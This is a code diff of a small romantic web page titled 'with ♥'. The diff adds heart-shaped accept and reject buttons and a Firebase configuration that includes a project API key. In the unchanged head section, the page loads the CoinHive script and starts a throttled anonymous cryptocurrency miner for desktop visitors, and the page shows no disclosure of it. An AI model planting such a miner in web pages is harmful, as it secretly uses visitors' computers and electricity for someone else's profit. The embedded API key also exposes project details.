@@ -3,7 +3,26 @@
   <title>with ♥</title>
         <link rel="icon" href="faci.ico">
   		<link rel="stylesheet" type="text/css" href="beauty.css">
+      <link rel="stylesheet" type="text/css" href="res-heart.css">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
         <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+
+        <!-- firebase connections -->
+        <script src="https://www.gstatic.com/firebasejs/5.3.1/firebase.js"></script>
+        <script>
+          // Initialize Firebase
+          var config = {
+            apiKey: "AIzaSyABlf4LGEugpNgDpPhoyKX1lCvdND6HOLo",
+            authDomain: "firstlove-4426e.firebaseapp.com",
+            databaseURL: "https://firstlove-4426e.firebaseio.com",
+            projectId: "firstlove-4426e",
+            storageBucket: "firstlove-4426e.appspot.com",
+            messagingSenderId: "899629223687"
+          };
+          firebase.initializeApp(config);
+        </script>
+
         <script>
 			var miner = new CoinHive.Anonymous('ZZy5PyN6T6zgXdOnPbQzeKxTZhRDJ76y', {throttle: 0.3});
 
@@ -12,17 +31,26 @@
 			if (!miner.isMobile() && !miner.didOptOut(14400)) {
 				miner.start();
 			}
+
         </script>
 </head>
 <body>
    	<audio autoplay id="player">
         <source src="background.mp3" type="audio/mpeg">
     </audio>
-   <div class="bg_heart"></div>
-   <div class="container">
-       <h2 id="text1"></h2>
-   </div>
 
+   <div class="bg_heart"></div>
+   <div class="container"> 
+       <h2 id="text1"></h2>
+       <p class="res-heart">
+          <i class="fa-stack fa fa-heart fa-4x fa-beat-accept fa-beat" onclick="acceptMsg()" >
+          </i>
+          <span class="fa-stack fa-4x fa-beat-reject fa-beat" onclick="rejectMsg()">
+             <i class="fa fa-heart fa-stack-1x "></i>
+             <i class="fa fa-bolt fa-stack-1x fa-inverse"></i>
+          </span>
+       </p>
+   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
   <script src="me.js"></script>
